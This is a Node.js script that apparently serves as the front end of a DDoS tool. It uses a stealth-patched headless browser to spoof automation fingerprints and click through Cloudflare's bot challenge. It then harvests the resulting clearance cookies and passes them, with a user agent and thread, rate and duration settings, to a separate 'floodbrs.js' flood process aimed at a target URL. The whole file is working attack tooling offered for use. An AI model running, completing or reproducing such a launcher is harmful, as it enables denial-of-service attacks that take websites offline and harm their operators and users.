const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COLORS = {
    RED: '\x1b[31m',
    GREEN: '\x1b[32m',
    YELLOW: '\x1b[33m',
    BLUE: '\x1b[34m',
    RESET: '\x1b[0m'
};

// ULTIMATE STEALTH CONFIGURATION
const applyUltimateStealth = async (page) => {
    await page.evaluateOnNewDocument(() => {
        // Remove all automation detection
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        
        // Spoof plugins
        Object.defineProperty(navigator, 'plugins', {
            get: () => [
                {
                    name: 'Chrome PDF Plugin',
                    filename: 'internal-pdf-viewer',
                    description: 'Portable Document Format'
                },
                {
                    name: 'Chrome PDF Viewer', 
                    filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai',
                    description: 'Portable Document Format'
                }
            ]
        });

        // Spoof languages
        Object.defineProperty(navigator, 'languages', {
            get: () => ['en-US', 'en', 'id-ID', 'id']
        });

        // Mock Chrome runtime
        window.chrome = {
            runtime: {
                connect: () => ({
                    onMessage: { addListener: () => {} },
                    postMessage: () => {},
                    onDisconnect: { addListener: () => {} }
                }),
                sendMessage: () => {},
                onMessage: { addListener: () => {} },
                onConnect: { addListener: () => {} },
                getManifest: () => ({}),
                id: 'testid'
            },
            loadTimes: () => ({
                firstPaintTime: 0,
                requestTime: 0,
                startLoadTime: 0,
                commitLoadTime: 0
            }),
            csi: () => ({
                onloadT: Date.now(),
                startE: Date.now() - 1000,
                pageT: 1200
            }),
            app: {
                isInstalled: false,
                InstallState: {
                    DISABLED: 'disabled',
                    INSTALLED: 'installed', 
                    NOT_INSTALLED: 'not_installed'
                },
                RunningState: {
                    CANNOT_RUN: 'cannot_run',
                    READY_TO_RUN: 'ready_to_run',
                    RUNNING: 'running'
                }
            }
        };

        // Hardware spoofing
        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 8 });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 0 });

        // Document properties
        Object.defineProperty(document, 'hidden', { value: false });
        Object.defineProperty(document, 'visibilityState', { value: 'visible' });

        // Remove all automation traces
        const automationProps = [
            '__webdriver_evaluate',
            '__selenium_evaluate', 
            '__webdriver_script_function',
            '__webdriver_script_func',
            '__webdriver_script_fn',
            '__webdriver_script_fn',
            '_Selenium_IDE_Recorder',
            '_selenium',
            'callPhantom',
            'callSelenium',
            'phantom',
            'webdriver',
            'selenium',
            '_phantom'
        ];
        automationProps.forEach(prop => delete window[prop]);
    });
};

const getUltimateArgs = () => [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--disable-blink-features=AutomationControlled',
    '--disable-infobars',
    '--ignore-certificate-errors',
    '--ignore-ssl-errors',
    '--disable-web-security',
    '--disable-features=site-per-process,TranslateUI',
    '--disable-ipc-flooding-protection',
    '--disable-backgrounding-occluded-windows',
    '--disable-renderer-backgrounding',
    '--disable-background-timer-throttling',
    '--disable-background-networking',
    '--disable-client-side-phishing-detection',
    '--disable-default-apps',
    '--disable-extensions',
    '--disable-component-extensions-with-background-pages',
    '--disable-translate',
    '--no-default-browser-check',
    '--no-first-run',
    '--window-size=1920,1080',
    '--user-data-dir=/tmp/puppeteer'
];

// ULTIMATE CLOUDFLARE SOLVER - FOLLOWING EXACT FLOW
const ultimateCloudflareSolver = async (page, proxy, targetURL) => {
    log('SOLVER', `Starting for ${maskProxy(proxy)}`, 'BLUE');
    
    // Initial wait for page load
    await sleep(3);
    
    let title = await page.title().catch(() => '');
    let currentUrl = page.url();
    
    log('DEBUG', `Current title: "${title}"`, 'YELLOW');
    log('DEBUG', `Current URL: ${currentUrl}`, 'YELLOW');

    // Check if already passed
    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
        log('SUCCESS', 'Already bypassed!', 'GREEN');
        return { solved: true, scenario: 'already_passed' };
    }

    log('INFO', 'Cloudflare challenge detected', 'YELLOW');

    // PHASE 1: Wait for "Verifying..." (15 seconds)
    log('PHASE 1', 'Waiting for verification (15 seconds)...', 'BLUE');
    await sleep(15);

    // Check if passed after initial wait
    title = await page.title().catch(() => '');
    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
        log('SUCCESS', 'Auto-verification successful!', 'GREEN');
        return { solved: true, scenario: 'auto_verification' };
    }

    // PHASE 2: Look for checkbox in all frames
    log('PHASE 2', 'Looking for checkbox...', 'BLUE');
    
    const frames = await page.frames();
    let foundFrame = false;
    let checkboxClicked = false;

    for (const frame of frames) {
        try {
            const frameUrl = frame.url();
            if (frameUrl.includes('challenges.cloudflare.com') || frameUrl.includes('/cdn-cgi/')) {
                log('DEBUG', `Found Cloudflare frame: ${frameUrl}`, 'YELLOW');
                foundFrame = true;

                // Wait a bit more for checkbox to appear
                await sleep(3);

                // Try multiple checkbox selectors
                const checkboxSelectors = [
                    'input[type="checkbox"]',
                    '.cf-challenge-checkbox',
                    '[role="checkbox"]',
                    '#cf-challenge-checkbox',
                    '.hcaptcha-checkbox',
                    '.recaptcha-checkbox',
                    '[aria-label*="checkbox"]',
                    '[id*="checkbox"]'
                ];

                for (const selector of checkboxSelectors) {
                    try {
                        // Wait for selector to appear
                        await frame.waitForSelector(selector, { timeout: 5000 }).catch(() => {});
                        const element = await frame.$(selector);
                        
                        if (element) {
                            const isVisible = await element.isIntersectingViewport();
                            if (isVisible) {
                                log('SUCCESS', `Found checkbox: ${selector}`, 'GREEN');
                                
                                // Click the checkbox
                                await element.click({ delay: 100 + Math.random() * 100 });
                                log('SUCCESS', 'Checkbox clicked!', 'GREEN');
                                checkboxClicked = true;
                                
                                // PHASE 3: Wait for redirect to main website (15 seconds)
                                log('PHASE 3', 'Waiting for redirect (15 seconds)...', 'BLUE');
                                await sleep(15);
                                
                                // Check if we're on main website now
                                title = await page.title().catch(() => '');
                                currentUrl = page.url();
                                
                                if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                                    log('SUCCESS', 'Redirected to main website!', 'GREEN');
                                    return { solved: true, scenario: 'checkbox_success' };
                                }
                                
                                break;
                            }
                        }
                    } catch (error) {
                        // Continue to next selector
                    }
                }

                // If no checkbox found but we have the frame, try clicking any button
                if (!checkboxClicked) {
                    log('INFO', 'No checkbox found, trying buttons...', 'YELLOW');
                    const buttons = await frame.$$('button, [role="button"], [onclick]');
                    for (const button of buttons) {
                        const isVisible = await button.isIntersectingViewport();
                        if (isVisible) {
                            await button.click({ delay: 100 }).catch(() => {});
                            log('INFO', 'Clicked button', 'YELLOW');
                            await sleep(15);
                            
                            title = await page.title().catch(() => '');
                            if (!title.includes('Just a moment')) {
                                log('SUCCESS', 'Button click successful!', 'GREEN');
                                return { solved: true, scenario: 'button_success' };
                            }
                            break;
                        }
                    }
                }

                break;
            }
        } catch (error) {
            log('ERROR', `Frame error: ${error.message}`, 'RED');
        }
    }

    // PHASE 4: If no frame found or still not solved, try alternative methods
    if (!foundFrame || !checkboxClicked) {
        log('PHASE 4', 'Trying alternative methods...', 'BLUE');
        
        // Method 1: Refresh page
        await page.reload({ waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
        await sleep(20);
        
        title = await page.title().catch(() => '');
        if (!title.includes('Just a moment')) {
            log('SUCCESS', 'Refresh successful!', 'GREEN');
            return { solved: true, scenario: 'refresh_success' };
        }

        // Method 2: Direct navigation with headers
        await page.setExtraHTTPHeaders({
            'Referer': 'https://www.google.com/',
            'Accept-Language': 'en-US,en;q=0.9'
        });
        
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0', 
            timeout: 45000 
        }).catch(() => {});
        
        await sleep(20);
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment')) {
            log('SUCCESS', 'Direct navigation successful!', 'GREEN');
            return { solved: true, scenario: 'direct_success' };
        }
    }

    log('ERROR', 'All solving methods failed', 'RED');
    return { solved: false, scenario: 'all_failed' };
};

// EXTRACT CLOUDFLARE COOKIES
const extractCloudflareCookies = async (page, targetURL) => {
    await sleep(5);
    
    // Get all cookies
    const allCookies = await page.cookies().catch(() => []);
    
    if (allCookies.length === 0) {
        log('COOKIES', 'No cookies found', 'YELLOW');
        return { cookies: '', count: 0, names: [] };
    }

    // Filter Cloudflare cookies
    const cloudflareCookies = allCookies.filter(cookie => 
        cookie.name.includes('cf_') ||
        cookie.name.includes('__cf') ||
        cookie.domain.includes('cloudflare')
    );

    log('COOKIES', `Total cookies: ${allCookies.length}`, 'GREEN');
    
    if (cloudflareCookies.length > 0) {
        const cloudflareNames = cloudflareCookies.map(c => c.name).join(', ');
        log('COOKIES', `Cloudflare cookies: ${cloudflareNames}`, 'BLUE');
        
        const cookieString = cloudflareCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        return {
            cookies: cookieString,
            count: cloudflareCookies.length,
            names: cloudflareCookies.map(c => c.name)
        };
    } else {
        // If no Cloudflare cookies, use all cookies
        log('COOKIES', 'No Cloudflare cookies, using all cookies', 'YELLOW');
        const cookieString = allCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        const allNames = allCookies.map(c => c.name).join(', ');
        log('COOKIES', `All cookies: ${allNames}`, 'YELLOW');
        
        return {
            cookies: cookieString,
            count: allCookies.length,
            names: allCookies.map(c => c.name)
        };
    }
};

// Command-line setup
if (process.argv.length < 6) {
    console.log('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    console.log('Example: node browser.js https://example.com 2 proxies.txt 10 120');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let successCount = 0;

// Utility functions
const generateRandomString = (length) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
};

const validKey = generateRandomString(16);

const readProxies = (filePath) => {
    try {
        const proxies = fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
        return [proxies[0]]; // Use first proxy only
    } catch (error) {
        log('ERROR', 'Cannot read proxy file', 'RED');
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2) {
        const ip = parts[0];
        if (ip.split('.').length === 4) {
            return `${ip.split('.')[0]}.${ip.split('.')[1]}.**.**:****`;
        }
    }
    return proxy;
};

const log = (type, message, color = 'RESET') => {
    const colorCode = COLORS[color] || COLORS.RESET;
    console.log(`${colorCode}[${type}] ${message}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0`
];

// ULTIMATE BROWSER LAUNCHER
const launchUltimateBrowser = async (targetURL, proxy, attempt = 1) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            `--user-agent=${userAgent}`,
            ...getUltimateArgs()
        ],
        defaultViewport: { 
            width: 1920, 
            height: 1080 
        },
        ignoreHTTPSErrors: true
    };

    try {
        log('LAUNCH', `Attempt ${attempt} for ${maskProxy(proxy)}`, 'BLUE');
        
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Apply ultimate stealth
        await applyUltimateStealth(page);

        // Set realistic headers
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        });

        log('NAVIGATE', `Going to: ${targetURL}`, 'BLUE');
        
        // Navigate to target
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0', 
            timeout: 60000 
        }).catch(() => {});

        // Solve Cloudflare with ultimate solver
        const solveResult = await ultimateCloudflareSolver(page, proxy, targetURL);
        
        if (!solveResult.solved) {
            throw new Error(`Cloudflare challenge failed: ${solveResult.scenario}`);
        }

        // Extract cookies (Cloudflare preferred, fallback to all)
        const cookieResult = await extractCloudflareCookies(page, targetURL);
        
        successCount++;
        log('SUCCESS', `Bypassed via ${solveResult.scenario}! Cookies: ${cookieResult.count}`, 'GREEN');

        await browser.close();

        return {
            cookies: cookieResult.cookies,
            userAgent: userAgent,
            cookieCount: cookieResult.count,
            cookieNames: cookieResult.names,
            scenario: solveResult.scenario
        };

    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        
        if (attempt < 3) { // Increased to 3 attempts
            const retryDelay = 10 + attempt * 5;
            log('RETRY', `Retrying in ${retryDelay}s (${attempt}/3)...`, 'YELLOW');
            await sleep(retryDelay);
            return launchUltimateBrowser(targetURL, proxy, attempt + 1);
        }
        
        log('FAILED', `${maskProxy(proxy)} - ${error.message}`, 'RED');
        return null;
    }
};

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    
    if (proxies.length === 0) {
        log('ERROR', 'No proxies found', 'RED');
        process.exit(1);
    }

    log('START', `Target: ${targetURL}`, 'GREEN');
    log('INFO', `Using 1 proxy | Flood threads: ${threads} | Time: ${duration}s | Rate: ${rate}`, 'BLUE');

    // Process the proxy
    const proxy = proxies[0];
    
    try {
        const result = await launchUltimateBrowser(targetURL, proxy);
        
        if (result && result.cookies) {
            log('RESULT', `Proxy ${maskProxy(proxy)} - ${result.cookieCount} cookies (${result.cookieNames.join(', ')})`, 'GREEN');
            log('RESULT', `Bypass method: ${result.scenario}`, 'GREEN');
            
            // Launch flood process with threads
            try {
                log('FLOOD', `Starting flood with ${threads} threads, rate ${rate} for ${duration}s`, 'GREEN');
                const floodProcess = spawn('node', [
                    'floodbrs.js',
                    targetURL,
                    duration.toString(),
                    rate,
                    threads.toString(), // Threads for floodbrs.js
                    proxyFile,
                    result.cookies,
                    result.userAgent,
                    validKey
                ], {
                    detached: false,
                    stdio: 'inherit'
                });
                
                floodProcess.on('close', (code) => {
                    log('FLOOD', `Flood process completed`, 'YELLOW');
                    process.exit(0);
                });
                
            } catch (error) {
                log('ERROR', `Failed to start flood: ${error.message}`, 'RED');
            }
        } else {
            log('ERROR', 'No cookies obtained', 'RED');
        }
    } catch (error) {
        log('ERROR', error.message, 'RED');
    }
};

// Error handling
process.on('uncaughtException', (error) => {
    log('CRASH', error.message, 'RED');
});

process.on('unhandledRejection', (error) => {
    log('REJECTION', error.message, 'RED');
});

process.on('SIGINT', () => {
    log('INFO', 'Shutdown signal received', 'YELLOW');
    process.exit(0);
});

log('READY', 'ULTIMATE CLOUDFLARE BYPASS - STRONG STEALTH MODE', 'GREEN');
main().catch(error => {
    log('ERROR', error.message, 'RED');
    process.exit(1);
});
